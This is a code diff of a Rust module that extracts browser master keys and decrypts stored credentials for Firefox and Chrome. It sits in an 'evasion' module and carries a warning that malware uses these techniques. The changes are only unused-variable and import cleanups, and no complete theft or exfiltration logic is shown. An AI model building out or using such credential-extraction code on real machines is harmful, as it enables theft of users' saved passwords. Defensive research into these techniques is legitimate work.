@@ -8,7 +8,7 @@
 //! WARNING: These techniques are used by malware to steal credentials.
 //! Use only for educational/defensive research purposes.
 
-use std::path::{Path, PathBuf};
+use std::path::Path;
 
 use crate::module::evasion::errors::EvasionError;
 
@@ -131,7 +131,7 @@ impl MasterKeyExtractor {
 
     /// Extract Firefox master key from key4.db
     pub fn extract_firefox_master_key(
-        profile_path: &Path,
+        _profile_path: &Path,
     ) -> Result<MasterKey, EvasionError> {
         // Firefox uses PKCS#11/NSS for encryption
         // Full implementation would need NSS libraries
@@ -192,9 +192,9 @@ impl MasterKeyExtractor {
 
     #[cfg(target_os = "linux")]
     fn extract_chrome_master_key_linux(
-        local_state_path: &Path,
+        _local_state_path: &Path,
     ) -> Result<MasterKey, EvasionError> {
-        use std::fs;
+        
 
         // On Linux, Chrome uses libsecret/GNOME Keyring
         // The Local State file doesn't contain the master key
@@ -314,7 +314,7 @@ impl MasterKeyExtractor {
         // Split ciphertext and tag
         let tag_start = ciphertext_with_tag.len() - 16;
         let ciphertext = &ciphertext_with_tag[0..tag_start];
-        let tag = &ciphertext_with_tag[tag_start..];
+        let _tag = &ciphertext_with_tag[tag_start..];
 
         // Use aes-gcm crate for decryption
         use aes_gcm::{
@@ -342,6 +342,7 @@ impl MasterKeyExtractor {
 }
 
 /// Base64 decode helper
+#[allow(dead_code)]
 fn base64_decode(encoded: &str) -> Result<Vec<u8>, EvasionError> {
     use base64::{engine::general_purpose::STANDARD, Engine};
     STANDARD
